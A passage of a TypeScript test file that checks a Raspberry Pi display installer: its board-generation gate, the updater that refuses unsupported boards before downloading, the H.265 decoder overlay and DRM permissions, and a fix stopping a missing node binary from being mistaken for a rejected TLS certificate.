  assert.ok(gate, 'could not find the board gate — has it been renamed?');
  assert.ok(!gate[0].includes('\+'), 'the sed expression must not use the GNU-only \+');

  const script = [
    'MODEL="$1"',
    gate[0],
    'if [ -n "$PI_GEN" ] && [ "$PI_GEN" -lt 4 ]; then echo REFUSED; else echo ALLOWED; fi',
  ].join('\n');

  const run = (model: string): string =>
    execFileSync('sh', ['-c', script, 'sh', model], { encoding: 'utf8' }).trim();

  for (const m of ['Raspberry Pi 3 Model B Plus Rev 1.3', 'Raspberry Pi 2 Model B Rev 1.1']) {
    assert.equal(run(m), 'REFUSED', m);
  }
  for (const m of ['Raspberry Pi 4 Model B Rev 1.4', 'Raspberry Pi 5 Model B Rev 1.0', 'Raspberry Pi 10 Model B']) {
    assert.equal(run(m), 'ALLOWED', m);
  }
  // An unrecognised board must NOT be refused: bricking a screen over a string comparison is worse
  // than running on something slow, and a Zero or a Compute Module is a deliberate choice.
  for (const m of ['', 'Raspberry Pi Zero 2 W', 'Raspberry Pi Compute Module 4', 'BananaPi M5']) {
    assert.equal(run(m), 'ALLOWED', m || '(empty)');
  }
});

test('the updater refuses an unsupported board instead of bricking a working screen', () => {
  // The destructive way to end Pi 3 support is to let a Pi 3 download an agent it cannot run: it
  // crashes, systemd restarts it every five seconds, and a masjid finds a black screen having
  // touched nothing. The updater must bail BEFORE it fetches anything.
  const tpl = installerTemplate() as string;
  const upd = tpl.slice(tpl.indexOf('cat > "$PREFIX/update.sh"'), tpl.indexOf('chmod 700 "$PREFIX/update.sh"'));
  assert.ok(upd.includes('PI_GEN='), 'the updater needs its own board gate');

  const gateAt = upd.indexOf('PI_GEN=');
  const fetchAt = upd.indexOf('curl -fsSL');
  assert.ok(fetchAt > 0, 'could not find the download in update.sh');
  assert.ok(gateAt < fetchAt, 'the board gate must come BEFORE the download, or it has already happened');
  // And it exits 0, so the caller does not treat "not supported" as a failure worth retrying.
  const branch = upd.slice(gateAt, fetchAt);
  assert.match(branch, /exit 0/, 'refusing is a normal outcome, not an error');
  assert.match(branch, /keeping the version already installed/, 'it must say the screen is being left alone');
});

test('the H.265 decoder is switched on, and reachable once it is', () => {
  // A Pi 4 has two unrelated video decoders. H.264 uses the old VideoCore block; H.265 uses a
  // dedicated unit (rpivid) that only appears as a device when its overlay is loaded. Miss either
  // half — the overlay, or permission to open the DRM nodes the stateless decoder is driven through
  // — and hardware HEVC silently does not happen, which is the one thing this migration is for.
  const tpl = installerTemplate() as string;
  // Matched as a substring, not anchored to a line: the line is written by a printf, so in THIS
  // file it sits inside a single-quoted string after a literal \n rather than at a line start.
  assert.ok(tpl.includes('dtoverlay=rpivid-v4l2'), 'without the overlay there is no /dev/video19');
  // And it must be what gets appended, not merely mentioned in a comment.
  assert.match(tpl, /printf '[^']*dtoverlay=rpivid-v4l2/, 'the overlay must actually be written to config.txt');
  // Added only if absent, so re-running the installer does not grow config.txt.
  assert.match(tpl, /grep -q '\^dtoverlay=rpivid-v4l2'/, 'the overlay must be added idempotently');
  // And a boot-config change is useless until the Pi restarts, so it has to say so.
  const block = tpl.slice(tpl.indexOf("grep -q '^dtoverlay=rpivid-v4l2'"));
  assert.match(block.slice(0, 400), /NEEDS_REBOOT=1/, 'the overlay needs a reboot to take effect');

  // The DRM class, not just the V4L2 class. char-video4linux is major 81 and the DRM nodes are 226,
  // so the video4linux line alone leaves the HEVC path permitted at the file level and blocked by
  // systemd — indistinguishable, from ffmpeg's side, from having no decoder.
  assert.match(tpl, /^DeviceAllow=char-drm rw$/m, 'hardware H.265 opens /dev/dri/*');
  assert.match(tpl, /^DeviceAllow=char-video4linux rw$/m, 'and hardware H.264 opens /dev/video*');
});

test('a missing node is not mistaken for a rejected certificate', () => {
  // The bug: the trust step asked node's opinion of a freshly pinned certificate, and node is not
  // installed until step 3. On a fresh Raspberry Pi OS Lite image the clause exited 127, the
  // `2>/dev/null` swallowed "command not found", the `if` went false, and the installer announced
  // "the certificate does not name the address" about a certificate whose name was fine — then wrote
  // NODE_TLS_REJECT_UNAUTHORIZED=0 into the service unit. A missing interpreter was byte-identical
  // to a TLS rejection, and it only ever affected FIRST installs, which is what migrating to new
  // hardware consists of.
  const tpl = installerTemplate() as string;

  // node's opinion now goes through a helper that returns TRUE when there is no node to ask.
  assert.match(tpl, /^node_accepts_ca\(\) \{$/m, 'the node check must be a helper, not inline');
  const fn = tpl.slice(tpl.indexOf('node_accepts_ca() {'));
  const body = fn.slice(0, fn.indexOf('\n}\n'));
  assert.match(body, /command -v node/, 'it has to check node exists before asking it');
  assert.match(body, /NODE_CHECK_DEFERRED=1/, 'and record that the question is unanswered');
  assert.match(body, /return 0/, 'returning success when node is absent is the whole fix');

  // The trust decision calls the helper rather than node directly.
  const trust = tpl.slice(tpl.indexOf('--cacert "$CA"'), tpl.indexOf('pinned the server'));
  assert.match(trust, /node_accepts_ca/, 'the condition must go through the helper');
  assert.ok(!/NODE_EXTRA_CA_CERTS="\$CA" node -e/.test(trust), 'and not invoke node inline any more');
});

test('the deferred certificate check happens after node is installed, and only weakens node', () => {
  const tpl = installerTemplate() as string;
  const install = tpl.indexOf("die 'node did not install");
  const recheck = tpl.indexOf('NODE_CHECK_DEFERRED" = 1');
  assert.ok(install > 0 && recheck > 0, 'both the install assertion and the re-check must exist');
  assert.ok(recheck > install, 'asking node before node exists is the bug being fixed');

  // The re-check must NOT touch CURL_OPTS: trust.env is written before this point, so a change
  // there would never reach the updater — and curl validated the certificate perfectly well, so
  // weakening it would give up verification that is working.
  const block = tpl.slice(recheck, tpl.indexOf('step ', recheck));
  assert.ok(!/CURL_OPTS=/.test(block), 'the re-check must not change curl, only node');
  assert.match(block, /NODE_TLS_ENV=/, 'it must change the setting that actually reaches the unit');

  const trustEnvAt = tpl.indexOf('} > "$TRUSTENV"');
  assert.ok(trustEnvAt > 0 && trustEnvAt < recheck, 'trust.env is written before the re-check — hence the above');
});
